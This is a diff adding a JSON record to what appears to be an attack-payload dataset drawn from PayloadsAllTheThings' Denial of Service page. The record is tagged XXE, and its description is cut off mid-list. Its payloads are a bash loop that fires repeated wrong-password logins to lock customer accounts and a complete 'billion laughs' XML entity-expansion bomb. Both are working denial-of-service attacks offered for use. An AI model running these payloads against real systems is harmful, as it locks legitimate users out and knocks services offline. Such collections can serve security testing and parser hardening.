@@ -1,0 +1,27 @@
+{
+  "id": "xxe-4f8d6ab4f5ae",
+  "category": "XXE",
+  "title": "README",
+  "description": "# Denial of Service\n\n> A Denial of Service (DoS) attack aims to make a service unavailable by overwhelming it with a flood of illegitimate requests or exploiting vulnerabilities in the target's software to crash or degrade performance. In a Distributed Denial of Service (DDoS), attackers use multiple sources (often compromised machines) to perform the attack simultaneously.\n\n## Summary\n\n* [Methodology](#methodology)\n    * [Locking Customer Accounts](#locking-customer-accounts)\n    * [File Limits",
+  "payloads": [
+    "for i in {1..100}; do curl -X POST -d \"username=user&password=wrong\" <target_login_url>; done",
+    "<?xml version=\"1.0\"?>",
+    "<!DOCTYPE lolz [",
+    "<!ENTITY lol \"lol\">",
+    "<!ELEMENT lolz (#PCDATA)>",
+    "<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">",
+    "<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">",
+    "<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">",
+    "<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">",
+    "<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">",
+    "<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">",
+    "<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">",
+    "<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">",
+    "<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">",
+    "<lolz>&lol9;</lolz>"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Denial of Service/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
